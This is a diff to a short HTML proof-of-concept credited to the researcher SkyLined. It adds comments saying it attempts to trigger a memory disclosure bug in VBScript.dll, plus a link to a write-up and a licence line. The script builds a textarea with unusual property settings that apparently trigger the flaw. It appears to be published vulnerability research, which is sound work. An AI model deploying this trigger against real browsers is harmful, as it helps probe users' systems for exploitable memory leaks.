@@ -1,9 +1,13 @@
 <!doctype html>
 <script>
+  // This PoC attempts to exploit a memory disclosure bug in VBScript.dll
+  // See http://blog.skylined.nl/20161101001.html for details.
   oTextArea = document.createElement('textarea');
   oTextArea.dataSrc = 1;
   oTextArea.id = 1;
   oTextArea.innerHTML = 1;
   oTextArea.onvolumechange = 1;
   oTextArea.style.setProperty('list-style', "url()");
+  // This work by SkyLined is licensed under a Creative Commons
+  // Attribution-Non-Commercial 4.0 International License. 
 </script>
